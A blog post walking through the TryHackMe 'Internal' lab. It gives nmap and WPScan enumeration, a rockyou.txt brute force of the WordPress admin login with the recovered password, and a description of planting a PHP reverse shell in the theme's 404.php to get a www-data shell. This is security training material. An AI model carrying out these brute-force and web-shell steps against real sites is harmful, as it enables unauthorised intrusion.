---
layout: post
title: THM Internal
date: 2022-07-10
categories: ["TryHackMe", "Internal", "Hard"]
---
This is my first writeup on this blog.

Starting the test with Nmap scan, It is found that there is a HTTP server running on port 80 with phpmyadmin, wordpress.

```bash
sudo nmap -sV -A --script vuln inter.thm

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-dombased-xss: Couldn\'t find any DOM based XSS.
|_http-stored-xss: Couldn\'t find any stored XSS vulnerabilities.
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
```

The scan shows that **wordpress** login is available. On navigating to the login page, it has been found that there is a difference of error thrown, when username is **admin** and something else. we can also confirm this with **WPScan**.

```bash
wpscan --url http://internal.thm/blog/ -e u

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

And then i started bruteforcing **wordpress** login page with rockyou.txt 
```
wpscan --url http://internal.thm/blog/ -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

```

after logging in as **admin** and browsing through the site, you can see a private post as 

> Don’t forget to reset Will’s credentials. william:arnold147

but these credentials could not be used anywhere. 

Later, I have uploaded a PHP reverse shell code in 404.php, in appearance settings as admin. when i browsed through a non-existant page in the site, i was able to get initial shell as **www-data**
